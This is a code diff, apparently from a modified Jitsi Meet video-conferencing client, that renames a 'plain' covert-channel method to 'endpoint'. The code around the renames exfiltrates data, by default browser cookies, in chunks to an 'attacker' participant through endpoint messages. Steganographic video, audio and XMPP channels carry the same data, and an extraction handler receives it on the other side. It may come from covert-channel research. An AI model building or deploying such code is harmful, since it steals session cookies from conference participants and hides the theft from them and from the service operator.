@@ -7,7 +7,7 @@ import { AudioMixerEffect } from '../react/features/stream-effects/audio-mixer/A
 import VideoSteganoEffect from './VideoSteganoEffect';
 
 export const defaultConfigurationValues = {
-    method: 'plain',
+    method: 'endpoint',
     dataType: 'cookies',
     chunkSize: 5000,
     encryptionEnabled: true,
@@ -22,7 +22,7 @@ class CovertChannelMethods {
 
     // reference to all other methods
     static options = {
-        'plain': CovertChannelMethods.usePlain,
+        'endpoint': CovertChannelMethods.useEndpoint,
         'video': CovertChannelMethods.useVideo,
         'audio': CovertChannelMethods.useAudio,
         'xmpp': CovertChannelMethods.useXMPP
@@ -40,10 +40,10 @@ class CovertChannelMethods {
     }
 
     /**
-     * Sending data using simple plain method
+     * Sending data using simple endpoint method
      * @param {any} data - specified data to be sent
      */
-    static usePlain(data, attacker, configuration) {
+    static useEndpoint(data, attacker, configuration) {
         for (const chunkData of splitString(data, configuration.chunkSize)) {
             console.log('data:', chunkData);
             APP.conference.sendEndpointMessage(attacker.getId(), {
@@ -163,7 +163,7 @@ class ExtractionCovertChannelMethods {
 
     // reference to all other methods
     static options = {
-        'plain': ExtractionCovertChannelMethods.usedPlain,
+        'endpoint': ExtractionCovertChannelMethods.usedEndpoint,
         'video': ExtractionCovertChannelMethods.usedVideo,
         'audio': ExtractionCovertChannelMethods.usedAudio,
         'xmpp': ExtractionCovertChannelMethods.usedXMPP
@@ -216,7 +216,7 @@ class ExtractionCovertChannelMethods {
      * not used anymore
      * Receiving data using audio stream
      */
-    static usedPlain(user) {}
+    static usedEndpoint(user) {}
 }
 
 
@@ -341,11 +341,11 @@ export class ExtractionHandler {
 
     /**
      * Receive reply data through the specified extraction method.
-     * Could be either plain text payload data, or control info (ending message).
+     * Could be either endpoint text payload data, or control info (ending message).
      * @param {*} recievedData - Data received from endpointTextMessage.
      * @param {*} event - Custom event for dispatching data when extraction ended.
      */
-    receivePlainData(recievedData, event) {
+    receiveEndpointData(recievedData, event) {
         // extract data using specified method
         if (recievedData.isEnd) { // 'reply' control ending message
             if (event) {
